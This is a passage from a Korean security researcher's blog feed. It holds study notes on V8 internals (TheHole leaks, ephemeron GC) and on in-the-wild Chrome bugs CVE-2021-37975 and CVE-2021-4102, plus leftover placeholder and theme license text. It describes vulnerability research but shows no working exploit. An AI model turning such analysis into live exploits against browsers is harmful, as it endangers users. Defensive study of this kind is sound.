<span class="n">src</span><span class="o">/</span><span class="n">execution</span><span class="o">/</span><span class="n">messages</span><span class="p">.</span><span class="n">cc</span>
<span class="n">Handle</span><span class="o">&lt;</span><span class="n">JSMessageObject</span><span class="o">&gt;</span> <span class="n">MessageHandler</span><span class="o">::</span><span class="n">MakeMessageObject</span><span class="p">(</span>
    <span class="n">Isolate</span><span class="o">*</span> <span class="n">isolate</span><span class="p">,</span> <span class="n">MessageTemplate</span> <span class="n">message</span><span class="p">,</span> <span class="k">const</span> <span class="n">MessageLocation</span><span class="o">*</span> <span class="n">location</span><span class="p">,</span>
    <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">argument</span><span class="p">,</span> <span class="n">Handle</span><span class="o">&lt;</span><span class="n">FixedArray</span><span class="o">&gt;</span> <span class="n">stack_frames</span><span class="p">)</span> <span class="p">{</span>
                    <span class="p">...</span>
  <span class="n">Handle</span><span class="o">&lt;</span><span class="n">JSMessageObject</span><span class="o">&gt;</span> <span class="n">message_obj</span> <span class="o">=</span> <span class="n">factory</span><span class="o">-&gt;</span><span class="n">NewJSMessageObject</span><span class="p">(</span>
      <span class="n">message</span><span class="p">,</span> <span class="n">argument</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="n">shared_info</span><span class="p">,</span> <span class="n">bytecode_offset</span><span class="p">,</span>
      <span class="n">script_handle</span><span class="p">,</span> <span class="n">stack_frames_handle</span><span class="p">);</span>

  <span class="k">return</span> <span class="n">message_obj</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">src</span><span class="o">/</span><span class="n">heap</span><span class="o">/</span><span class="n">factory</span><span class="p">.</span><span class="n">cc</span>
<span class="n">Handle</span><span class="o">&lt;</span><span class="n">JSMessageObject</span><span class="o">&gt;</span> <span class="n">Factory</span><span class="o">::</span><span class="n">NewJSMessageObject</span><span class="p">(</span>
    <span class="n">MessageTemplate</span> <span class="n">message</span><span class="p">,</span> <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">argument</span><span class="p">,</span> <span class="kt">int</span> <span class="n">start_position</span><span class="p">,</span>
    <span class="kt">int</span> <span class="n">end_position</span><span class="p">,</span> <span class="n">Handle</span><span class="o">&lt;</span><span class="n">SharedFunctionInfo</span><span class="o">&gt;</span> <span class="n">shared_info</span><span class="p">,</span>
    <span class="kt">int</span> <span class="n">bytecode_offset</span><span class="p">,</span> <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Script</span><span class="o">&gt;</span> <span class="n">script</span><span class="p">,</span> <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">stack_frames</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Map</span><span class="o">&gt;</span> <span class="n">map</span> <span class="o">=</span> <span class="n">message_object_map</span><span class="p">();</span>
  <span class="n">JSMessageObject</span> <span class="n">message_obj</span> <span class="o">=</span>
      <span class="n">JSMessageObject</span><span class="o">::</span><span class="n">cast</span><span class="p">(</span><span class="n">New</span><span class="p">(</span><span class="n">map</span><span class="p">,</span> <span class="n">AllocationType</span><span class="o">::</span><span class="n">kYoung</span><span class="p">));</span>
  <span class="n">DisallowGarbageCollection</span> <span class="n">no_gc</span><span class="p">;</span>
                <span class="p">...</span>
  <span class="n">message_obj</span><span class="p">.</span><span class="n">set_argument</span><span class="p">(</span><span class="o">*</span><span class="n">argument</span><span class="p">,</span> <span class="n">SKIP_WRITE_BARRIER</span><span class="p">);</span>
                <span class="p">...</span>
  <span class="k">return</span> <span class="n">handle</span><span class="p">(</span><span class="n">message_obj</span><span class="p">,</span> <span class="n">isolate</span><span class="p">());</span>
<span class="p">}</span>
</code></pre></div></div>

<p>CreateMessageOrAbort에 이어 CreateMessage 호출, MakeMessageObject 호출, NewJSMessageObject 호출, exception이 <code class="language-plaintext highlighter-rouge">message_obj.set_argument(*argument, SKIP_WRITE_BARRIER);</code>를 통해 argument로 설정됨.</p>

<p>set_pending_message에 저장된 것은 pending_message() 를 통해 쓰이는데 <code class="language-plaintext highlighter-rouge">void BaselineCompiler::VisitSetPendingMessage()</code> 랑 <code class="language-plaintext highlighter-rouge">TNode&lt;HeapObject&gt; CodeStubAssembler::GetPendingMessage()</code>도 봐야하나… 머리가 복잡하다. GetPendingMessage()는 봐야 할 듯… 쓰이는 곳이 많지는 않네. CSA 런타임에서 쓰이는 듯.</p>

<h4 id="getpendingmessage">GetPendingMessage()</h4>

<p>생각해보니 GetPendingMessage()는 v8:12439 에서 생긴 함수임. GetPendingMessage()가 쓰이는 곳들 중에 유의미하게 살펴볼 곳은 없는 듯…</p>

<h4 id="pending_message">pending_message()</h4>

<p>void BaselineCompiler::VisitSetPendingMessage() 신경 써야 할까?</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">src</span><span class="o">/</span><span class="n">execution</span><span class="o">/</span><span class="n">isolate</span><span class="p">.</span><span class="n">cc</span>
<span class="kt">void</span> <span class="n">Isolate</span><span class="o">::</span><span class="n">ReportPendingMessages</span><span class="p">()</span> <span class="p">{</span>
					<span class="p">...</span>
  <span class="n">Object</span> <span class="n">message_obj</span> <span class="o">=</span> <span class="n">pending_message</span><span class="p">();</span>
  <span class="n">clear_pending_message</span><span class="p">();</span>
  					<span class="p">...</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">message_obj</span><span class="p">.</span><span class="n">IsTheHole</span><span class="p">(</span><span class="k">this</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">should_report_exception</span><span class="p">)</span> <span class="p">{</span>
  					<span class="p">...</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>TheHole 여부 체크함.</p>

<hr />

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">src</span><span class="o">/</span><span class="n">execution</span><span class="o">/</span><span class="n">isolate</span><span class="p">.</span><span class="n">cc</span>
<span class="kt">bool</span> <span class="n">Isolate</span><span class="o">::</span><span class="n">PropagatePendingExceptionToExternalTryCatch</span><span class="p">(</span>
    <span class="n">ExceptionHandlerType</span> <span class="n">top_handler</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">Object</span> <span class="n">exception</span> <span class="o">=</span> <span class="n">pending_exception</span><span class="p">();</span>
  					<span class="p">...</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">is_catchable_by_javascript</span><span class="p">(</span><span class="n">exception</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">SetTerminationOnExternalTryCatch</span><span class="p">();</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
  					<span class="p">...</span>
    <span class="c1">// Propagate to the external try-catch only if we got an actual message.</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">has_pending_message</span><span class="p">())</span> <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
    <span class="n">handler</span><span class="o">-&gt;</span><span class="n">message_obj_</span> <span class="o">=</span> <span class="k">reinterpret_cast</span><span class="o">&lt;</span><span class="kt">void</span><span class="o">*&gt;</span><span class="p">(</span><span class="n">pending_message</span><span class="p">().</span><span class="n">ptr</span><span class="p">());</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>has_pending_message()를 통해 TheHole 체크함.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">src</span><span class="o">/</span><span class="n">objects</span><span class="o">/</span><span class="n">objects</span><span class="p">.</span><span class="n">cc</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">MoveMessageToPromise</span><span class="p">(</span><span class="n">Isolate</span><span class="o">*</span> <span class="n">isolate</span><span class="p">,</span> <span class="n">Handle</span><span class="o">&lt;</span><span class="n">JSPromise</span><span class="o">&gt;</span> <span class="n">promise</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">isolate</span><span class="o">-&gt;</span><span class="n">has_pending_message</span><span class="p">())</span> <span class="k">return</span><span class="p">;</span>

  <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">message</span> <span class="o">=</span> <span class="n">handle</span><span class="p">(</span><span class="n">isolate</span><span class="o">-&gt;</span><span class="n">pending_message</span><span class="p">(),</span> <span class="n">isolate</span><span class="p">);</span>
  <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Symbol</span><span class="o">&gt;</span> <span class="n">key</span> <span class="o">=</span> <span class="n">isolate</span><span class="o">-&gt;</span><span class="n">factory</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">promise_debug_message_symbol</span><span class="p">();</span>
  <span class="n">Object</span><span class="o">::</span><span class="n">SetProperty</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">promise</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">message</span><span class="p">,</span> <span class="n">StoreOrigin</span><span class="o">::</span><span class="n">kMaybeKeyed</span><span class="p">,</span>
                      <span class="n">Just</span><span class="p">(</span><span class="n">ShouldThrow</span><span class="o">::</span><span class="n">kThrowOnError</span><span class="p">))</span>
      <span class="p">.</span><span class="n">Assert</span><span class="p">();</span>

  <span class="c1">// The message object for a rejected promise was only stored for this purpose.</span>
  <span class="c1">// Clear it, otherwise we might leak memory.</span>
  <span class="n">isolate</span><span class="o">-&gt;</span><span class="n">clear_pending_message</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div></div>

<p>has_pending_message()를 통해 TheHole 체크함.</p>

<p>이런…</p>

<h3 id="temporal-대상-트리거-코드-구현">Temporal 대상 트리거 코드 구현</h3>

<p>버그는 버그니까… 라는 생각으로 트리거 코드 한 번 구현해보자. 자신감도 쌓을 겸.</p>

<ol>
  <li>Temporal 에서 해당 코드 트리거되도록 poc 작성</li>
  <li>IteratorCloseOnException 트리거 확인</li>
</ol>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">src</span><span class="o">/</span><span class="n">flags</span><span class="o">/</span><span class="n">flag</span><span class="o">-</span><span class="n">definitions</span><span class="p">.</span><span class="n">h</span>
<span class="c1">// Features that are still work in progress (behind individual flags).</span>
<span class="cp">#define HARMONY_INPROGRESS_BASE(V)                                             \
  V(harmony_weak_refs_with_cleanup_some,                                       \
    "harmony weak references with FinalizationRegistry.prototype.cleanupSome") \
  V(harmony_import_assertions, "harmony import assertions")                    \
  V(harmony_temporal, "Temporal")                                              \
  V(harmony_shadow_realm, "harmony ShadowRealm")                               \
  V(harmony_struct, "harmony structs and shared structs")
</span></code></pre></div></div>

<p>Temporal은 아직 미완성된 feature라 –harmony-temoral 플래그가 필요함. <del>(근데 크롬 개발자도구에선 되던데? 뭐지…)</del> <a href="https://tc39.es/proposal-temporal/docs/timezone.html#getPossibleInstantsFor">tc39 페이지</a>에서만 사용 가능했던 것. Polyfill 인 듯.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">src</span><span class="o">/</span><span class="n">init</span><span class="o">/</span><span class="n">bootstrapper</span><span class="p">.</span><span class="n">cc</span>
  <span class="c1">// The TemporalInsantFixedArrayFromIterable functions is created but not</span>
  <span class="c1">// exposed, as it is used internally by GetPossibleInstantsFor.</span>
  <span class="p">{</span>
    <span class="n">Handle</span><span class="o">&lt;</span><span class="n">JSFunction</span><span class="o">&gt;</span> <span class="n">func</span> <span class="o">=</span> <span class="n">SimpleCreateFunction</span><span class="p">(</span>
        <span class="n">isolate_</span><span class="p">,</span>
        <span class="n">factory</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">InternalizeUtf8String</span><span class="p">(</span>
            <span class="s">"TemporalInstantFixedArrayFromIterable"</span><span class="p">),</span>
        <span class="n">Builtin</span><span class="o">::</span><span class="n">kTemporalInstantFixedArrayFromIterable</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="nb">false</span><span class="p">);</span>
    <span class="n">native_context</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">set_temporal_instant_fixed_array_from_iterable</span><span class="p">(</span><span class="o">*</span><span class="n">func</span><span class="p">);</span>
  <span class="p">}</span>
</code></pre></div></div>

<p>GetPossibleInstantsFor 에서 내부적으로만 사용한다 함.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>d8&gt; tz.getPossibleInstantsFor("asdf");


#
# Fatal error in , line 0
# unimplemented code
#
#
#
#FailureMessage Object: 0x7ffc881e5230
==== C stack trace ===============================

    ./x64.release/d8(+0x100eb33) [0x556348401b33]
    ./x64.release/d8(+0x100e3eb) [0x5563484013eb]
    ./x64.release/d8(+0x1004805) [0x5563483f7805]
    ./x64.release/d8(+0x45bf09) [0x55634784ef09]
    [0x5562cff0d9f8]
Trace/breakpoint trap (core dumped)
everyyy@baddell:/work/v8/220317_master/v8/out.gn$ 
</code></pre></div></div>

<p>왓더…</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">src</span><span class="o">/</span><span class="n">builtins</span><span class="o">/</span><span class="n">builtins</span><span class="o">-</span><span class="n">temporal</span><span class="p">.</span><span class="n">cc</span>
<span class="cp">#define TO_BE_IMPLEMENTED(id)   \
  BUILTIN_NO_RCS(id) {          \
    HandleScope scope(isolate); \
    UNIMPLEMENTED();            \
  }
</span>  					<span class="p">...</span>
<span class="cm">/* Temporal #sec-temporal.timezone.prototype.getpossibleinstantsfor */</span>
<span class="n">TO_BE_IMPLEMENTED</span><span class="p">(</span><span class="n">TemporalTimeZonePrototypeGetPossibleInstantsFor</span><span class="p">)</span>
</code></pre></div></div>

<p>아직 미구현 상태… 나중에 구현 풀리면 그때 해보자. TODO</p>


                    ]]>
                </content:encoded>
                <guid isPermaLink="false">/2022/03/23/thehole/</guid>
                <description>
                    
                    Let's try to leak TheHole
                    
                </description>
                <pubDate>Wed, 23 Mar 2022 14:05:00 +0900</pubDate>
                <author>syyyipe</author>
            </item>
        
    
        
            <item>
                <title>(cppgc)Oilpan Library</title>
                <link>http://localhost:4000/2022/01/26/cppgc-oilpan-library/</link>
                <content:encoded>
                    <![CDATA[
                    <h2 id="references">references</h2>

<p>issue: <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1056170">https://bugs.chromium.org/p/chromium/issues/detail?id=1056170</a></p>

<p>v8.dev posts<br />
<a href="https://v8.dev/blog/high-performance-cpp-gc">High-performance garbage collection for C++</a> (26 May 2020)<br />
<a href="https://v8.dev/blog/oilpan-library">Oilpan library</a> (10 Nov 2021)</p>

<p>design docs<br />
<a href="https://docs.google.com/document/d/1Cv2IcsiokkGc2K_5FBTDKekNzTn3iTEUyi9fDOud9wU/edit#heading=h.9gwyf3q34ija">Proposal: A C++ garbage collection library for Chromium</a> (10 Feb 2020)<br />
<a href="https://docs.google.com/document/d/1ylZ25WF82emOwmi_Pg-uU6BI1A-mIbX_MG9V87OFRD8/edit#heading=h.tlaem7damy6a">Universal Garbage Collection for V8</a> (12 Mar 2020)<br />
필요시 다음 것들도 읽어보기: 
<a href="https://docs.google.com/document/d/1B6iKRj4HI1zBYn_7XzE6Sn7ciPR9AvcD-ieFRXGlMCM/edit#heading=h.tlhkoj10c52x">ref1</a> 
<a href="https://docs.google.com/document/d/1ZhJY2fOoD8sH53ZxMh2927Zl8sXqA7azJgcQTWx-YKs/edit#heading=h.iyy9t2vkhqn5">ref2</a> 
<a href="https://docs.google.com/presentation/d/1uDiEjJ-f1VziBKmYcvpw2gglP47M53bwj1L-P__l9QY/edit#slide=id.g8a0323deba_0_0">ref3</a></p>


                    ]]>
                </content:encoded>
                <guid isPermaLink="false">/2022/01/26/cppgc-oilpan-library/</guid>
                <description>
                    
                    Analysis of Oilpan Library
                    
                </description>
                <pubDate>Wed, 26 Jan 2022 15:20:00 +0900</pubDate>
                <author>syyyipe</author>
            </item>
        
    
        
            <item>
                <title>CVE-2021-37975 itw bug in v8 ephemeron processing</title>
                <link>http://localhost:4000/2022/01/26/cve-2021-37975/</link>
                <content:encoded>
                    <![CDATA[
                    <p><a href="https://securitylab.github.com/research/in_the_wild_chrome_cve_2021_37975/">https://securitylab.github.com/research/in_the_wild_chrome_cve_2021_37975/</a></p>

<h2 id="test-env">test env.</h2>

<p>9.4.146.22에서 패치됨</p>

<p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1252878">CVE-2021-37977</a>과 같이 겸해서 볼까 생각중, 이건 9.4.146.18에서 패치</p>

<p>30603 테스트하던 9.4.146.14에서 테스트 예정, 9.4.146.22를 비교 대상으로.</p>

<h2 id="분석-전략">분석 전략</h2>

<p>issue 페이지는 공개되어 있지 않으므로 commit 메시지 및 패치 내역(diff)을 일단 훑어만 보자. 그리고 mym님 글 정독.</p>

<h2 id="ephemeron">ephemeron?</h2>

<p>ephemeron(=ephemera) 사전적 의미: 수명이 아주 짧은 것, 잠깐 쓰고 버리는 것</p>

<p><a href="https://en.wikipedia.org/wiki/Ephemeron">from wikipedia</a>: GC에서 두 가지 문제를 해결하기 위한 자료구조. 하나는 어떤 객체가 이제 막 수집될 것인지 알려줌. 다른 하나는 레퍼런스를 만들지 않고도 어떤 데이터가 어떤 객체와 연관이 있으며 이로 인해 gc로부터 수집되는 것을 방지하도록 하는 역할.</p>

<p>ephemeron이 뭔지 궁금해서 찾다가 논문까지 와버렸음.</p>

<p><a href="https://static.aminer.org/pdf/PDF/000/522/273/ephemerons_a_new_finalization_mechanism.pdf">Ephemerons: A New Finalization Mechanism, Barry Hayes</a>, 90년대 논문</p>

<p>weak pairs를 수정하여 만든 것이고 두 가지 문제를 해결하기 위함. 첫 번째 문제는 a problem case where objects needing finalization are being inappropriately retained by pointers contained in information needed for their own finalization. 두 번째 문제는 independent of resurrection(?).</p>

<p>“almost collectable”에 대한 명확한 정의가 기술되어있지 않고 잠깐 따로 검색해봐도 잘 모르겠다. property table, weak pair 등의 용어가 나오는데 이것들을 명확히 이해하지 않고는 논문을 제대로 이해하기 힘들 것 같다.</p>

<p><a href="https://www.gnu.org/software/mit-scheme/documentation/stable/mit-scheme-ref/Weak-References.html">https://www.gnu.org/software/mit-scheme/documentation/stable/mit-scheme-ref/Weak-References.html</a></p>

<p>Weak references: gc로부터 보호해주지 않는 reference를 의미. car, cdr이라는 용어가 나오는데 이것은 lisp같은 언어에서 나온듯… (<a href="https://medium.com/@aleksandrasays/my-other-car-is-a-cdr-3058e6743c15">ref</a>)</p>

<p>Weak pair: car: pointer(weakly), cdr: pointer(strongly). car와 cdr은 같은 것을 반드시 가르키는 것은 아님.</p>

<p>ephemeron: an object with two weakly referenced components called its “key” and “datum”. key에 대해 아무도 신경쓰지 않을 경우(strong ref가 없을 경우를 의미하는듯?) ephemeronon은 broken. 특히, datum이 ephemeron의 key를 가리키는 것은 broken을 막지 못함(이것은 weak pair와 가장 큰 차이점인듯).</p>

<h2 id="patch-commit">patch commit</h2>

<p>commit message: fixpoint(fixedpoint?) 도달을 위한 iteration 알고리즘(마킹을 위한 것이겠지…?)이 너무 오래 걸릴 경우 이를 중단하고 linear algorithm을 수행하도록 코드 refactoring. <br />
CHECK 구문 추가, local ephemerons를 global로 flush 하는 구분 추가. <br />
force another iteration when ProcessMarkingWorklist() processed some object –&gt; 
요게 취약점과 관련된 부분이 아닐까 예상해봄. 패치 코드를 보면 object_processed&gt;0 을 확인하여 iteration을 한 번 더 돌게 하는 구문이 추가되었음.<br />
VERIFY_HEAP 플래그 존재시 이를 검증하는 구문 추가.</p>

<h2 id="mym-포스팅-읽고-이해">mym 포스팅 읽고 이해</h2>

<h3 id="the-garbage-collector-in-v8">The garbage collector in v8</h3>

<p>v8은 mark-and-sweep gc. “visit”이 실제로 의미하는 바는 <a href="https://source.chromium.org/chromium/chromium/src/+/c7e42efb60d0e5768bdb096e7979d77333d32423:v8/src/heap/marking-visitor.h;l=122">Visit*</a> 함수를 호출하는 것을 의미함.</p>

<p>grey: objects got pushed onto the worklist</p>

<p>black: processed objects</p>

<p>white: not (yet) reachable</p>

<hr />

<p>v8 gc: a generational gc(old space &amp; new space for small objects, large object space for 1 « 17 bytes - where is it defined?)</p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// cppgc/globals.h</span>
<span class="p">...</span>
<span class="k">constexpr</span> <span class="kt">size_t</span> <span class="n">kPageSizeLog2</span> <span class="o">=</span> <span class="mi">17</span><span class="p">;</span>
<span class="k">constexpr</span> <span class="kt">size_t</span> <span class="n">kPageSize</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">kPageSizeLog2</span><span class="p">;</span>
<span class="p">...</span>
<span class="k">constexpr</span> <span class="kt">size_t</span> <span class="n">kLargeObjectSizeThreshold</span> <span class="o">=</span> <span class="n">kPageSize</span> <span class="o">/</span> <span class="mi">2</span><span class="p">;</span>
<span class="p">...</span>
</code></pre></div></div>

<p>kLargeObjectSizeThreshold가 기준이 되는 것일수도. 필요할 경우 추후에 더 찾아보자.</p>

<hr />

<p>minor gc(Scavenger), major gc(Full Mark-Compact, implemented in heap/mark-compact.cc) (<a href="https://v8.dev/blog/trash-talk">ref</a>)</p>

<p>concurrent marking: implemendted in heap/concurrent-marking.cc</p>

<p>main differences: concurrent marking은 몇 번의 iteration만 수행, mark-compact는 더이상 reachable objects가 발견되지 않을때까지 수행. <strong>중요!!</strong> concurrent marking은 uncertainty를 만들고 이를 추후에 uaf triggering시 이용할 것임</p>

<p>궁금점: concurrent marking은 minor gc 혹은 major gc와는 전혀 별개인 것인지? 개념, 관계가 잘 안잡히는데…</p>
<ul>
  <li><a href="https://v8.dev/blog/trash-talk#scavenging">ref</a>에 따르면 Scavenging은 parallel하게, major GC(mark and compact)는 concurrent하게 marking 이라고 함… (2019년 자료 기준)</li>
</ul>

<p>궁금점2: heap 경로 밑에 gc 관련 코드들이 많은데, heap/cppgc/ 밑에도 또한 많이 있음(이것들은 oilpan library 관련인 것으로 암). 정확한 관계, 내용 등이 궁금한데… 일단 oilpan cppgc 쪽을 공부하고 와야하나.</p>

<p>… 공부하러 가보자. <a href="https://v8.dev/blog/high-performance-cpp-gc">ref1</a> <a href="https://v8.dev/blog/oilpan-library">ref2</a><br />
이건 별도 문서로.</p>

<hr />

<p>ㅁㄴㅇㄹ</p>


                    ]]>
                </content:encoded>
                <guid isPermaLink="false">/2022/01/26/cve-2021-37975/</guid>
                <description>
                    
                    CVE-2021-37975
                    
                </description>
                <pubDate>Wed, 26 Jan 2022 08:30:00 +0900</pubDate>
                <author>syyyipe</author>
            </item>
        
    
        
            <item>
                <title>CVE-2021-4102</title>
                <link>http://localhost:4000/2022/01/07/CVE-2021-4102/</link>
                <content:encoded>
                    <![CDATA[
                    <p><a href="https://chromereleases.googleblog.com/2021/12/stable-channel-update-for-desktop_13.html">https://chromereleases.googleblog.com/2021/12/stable-channel-update-for-desktop_13.html</a></p>

<p>[$TBD][<a href="https://crbug.com/1278387">1278387</a>] High CVE-2021-4102: Use after free in V8. Reported by Anonymous on 2021-12-09</p>

<p>Google is aware of reports that an exploit for CVE-2021-4102 exists <strong><em>in the wild</em></strong>.</p>

<p><a href="https://chromium.googlesource.com/v8/v8/+/4fae8b16802a416fe3aab0e7792fabe96cf1ecd8">https://chromium.googlesource.com/v8/v8/+/4fae8b16802a416fe3aab0e7792fabe96cf1ecd8</a></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[compiler] Don't elide ChangeTaggedToInt32-&gt;ChangeInt31ToTaggedSigned

Bug: chromium:1278387
</code></pre></div></div>

<p>author	Leszek Swirski <a href="mailto:leszeks@chromium.org">leszeks@chromium.org</a>	Fri Dec 10 14:56:05 2021</p>

<h2 id="분석-전략">분석 전략</h2>

<p>poc 없음, 분석 포스팅 없음, 정보가 전무함. 
패치도 딸랑 한 줄이 전부고 패치에 대한 커맨트도 없음.</p>

<p>내가 이것을 익스플로잇 할 수 있을지… 솔직히 자신 없음.</p>

<p>다만, 패치된 곳의 코드가 트리거되도록 하는 코드만이라도 짜보는 것이 목표.
그리고, 그 주변의 코드를 학습하고 그 내용을 잊지 않도록 정리해보자.</p>

<h2 id="사전-작업">사전 작업</h2>

<p>최신버전이 아닌, 구버전을 분석하는 작업이다 보니 cs chromium 을 이용하기 보다는, 직접 로컬에 코드를 두고 직접 빌드하고 vscode+clangd를 이용한 분석을 선호한다.</p>

<p>9.6 버전을 선택하였으며 <a href="https://chromium.googlesource.com/v8/v8/+log/refs/heads/9.6-lkgr">https://chromium.googlesource.com/v8/v8/+log/refs/heads/9.6-lkgr</a>을 보고 9.6.180.20 버전을 선택.</p>

<p>clangd가 정상동작하지 않아서 삽질을 조금 하였음. 해결한 방법은 v8 빌드시 사용되는 clang 버전을 확인하고 이에 맞는 clangd를 받아서 설치하여 연동하도록 하였음. 자세한 내용은 슬랙 참고.</p>

<p>패치는 <strong>simplified-operator-reducer.cc</strong>에서 이루어졌으며 <strong>simplified-operator-reducer-unittest.cc</strong> 파일이 존재하는 것을 보고 unittest를 한 번 잠깐 살펴보았음.</p>

<p><img src="/images/2022-01-07_16:05:45.png" alt="unittests" /></p>

<p>test</p>

<blockquote>
  <p>asdf
asdf
asdf</p>

  <p>asdf</p>
</blockquote>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="c1">// Hello!</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
<span class="p">}</span>

</code></pre></div></div>

<h2 id="test-sharp">test sharp</h2>

<h3 id="test-sharp-1">test sharp</h3>

<p>The following is an overview to copying and sharing Pixyll.<sup id="fnref:1" role="doc-noteref"><a href="#fn:1" class="footnote" rel="footnote">1</a></sup></p>

<p>Most people have an understanding of what the copyright and licensing obligations are for source code, but not everyone has practical experience.  There is a lot of information about how to use free and open source source code generally, but not necessarily how it works specifically.</p>

<h2 id="basics">Basics</h2>

<p>Pixyll is free and open source software under the MIT license, a <em>permissive license</em>.  You can use Pixyll without charge and it is provided to you, “as is”, without warranty of any kind.</p>

<p>These are some of the rights for Pixyll since it is under the MIT license:<sup id="fnref:2" role="doc-noteref"><a href="#fn:2" class="footnote" rel="footnote">2</a></sup></p>

<ol>
  <li>You can <strong>copy</strong> Pixyll by forking it on GitHub or by any other means of copying.</li>
  <li>You can <strong>use</strong> Pixyll to publish your site without restriction or limitation.</li>
  <li>You can <strong>change</strong> Pixyll as you wish, and you can publish your site with a modified version of Pixyll.</li>
  <li>You can also <strong>distribute</strong> copies of Pixyll to other people.</li>
  <li>You can also <strong>distribute modified</strong> copies of Pixyll.</li>
</ol>

<p>Other rights you have of Pixyll under the MIT license:</p>

<ul>
  <li>You can <strong>sell</strong> copies of Pixyll, including copies you have modified.</li>
  <li>You can <strong>combine</strong> Pixyll with other works that are under the MIT license, or other permissive licenses, a copyleft license or a proprietary license.  Pixyll already does this itself by using Jekyll, Ruby and other dependencies.</li>
  <li>You can distribute copies of Pixyll to others under either the MIT license or you can <strong>relicense</strong> Pixyll under another license.  This includes a different permissive license, a copyleft license or a proprietary license.</li>
</ul>

<p>Your only responsibility is to preserve both the copyright notices of Pixyll and the MIT license in your copy or modified work.</p>

<h2 id="how-to">How to</h2>

<p>If you’ve modified Pixyll significantly and want to share your version, especially public copies of the code, then there are a few items you should do.</p>

<ol>
  <li>You should probably <strong>rename</strong> your fork of Pixyll with a different name.</li>
  <li>A new name isn’t required by the MIT license, but it is good etiquette.<sup id="fnref:3" role="doc-noteref"><a href="#fn:3" class="footnote" rel="footnote">3</a></sup></li>
  <li>You should add your name to the <strong>copyright</strong> of your version, and you should preserve the existing copyrights of Pixyll.</li>
  <li>Maintaining the copyright notices isn’t required of the MIT license, but it is suggested by the license and is a good practice for documenting the copyrights of your derived work.</li>
</ol>

<p>The items above do not apply when you just copied and modified Pixyll in small ways to just publish your site and you have no plans to fork Pixyll under a different name.</p>

<p>If you want to publish a fork of Pixyll under a different name but keeping it under the MIT license, then you should add your name to the copyright notices:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Copyright (c) 2021 Your Name
Copyright (c) 2014-2021 John Otander for Pixyll
</code></pre></div></div>

<p>However, if you want to publish a fork of Pixyll under a different name <em>and</em> a different license, then you should should still add your name to the copyright notices but have a section titled “Pixyll” at the bottom of your LICENSE file that preserves the copyright and license notices for Pixyll:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Pixyll

Copyright (c) 2014-2021 John Otander

MIT License

Permission is hereby granted, [...]
</code></pre></div></div>

<p>If you are just modifying Pixyll in small ways to customize your site, you are not obligated to maintain the copyright notices of Pixyll on your site.  However, if you want to credit the Pixyll theme that would be appreciated, see section on “Pixyll Plug” in the README file that came with Pixyll.</p>

<p>Thanks for using Pixyll, and happy hacking!</p>

<hr />
<div class="footnotes" role="doc-endnotes">
  <ol>
    <li id="fn:1" role="doc-endnote">
      <p><strong>Disclaimer</strong>: This material is for informational purposes only, and should not be construed as legal advice or opinion.  For actual legal advice, you should consult with professional legal services. <a href="#fnref:1" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:2" role="doc-endnote">
      <p>This list of privileges are derived from the four freedoms of “The Free Software Definition” published by the GNU project <a href="https://www.gnu.org/philosophy/free-sw.en.html">https://www.gnu.org/philosophy/free-sw.en.html</a>. <a href="#fnref:2" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:3" role="doc-endnote">
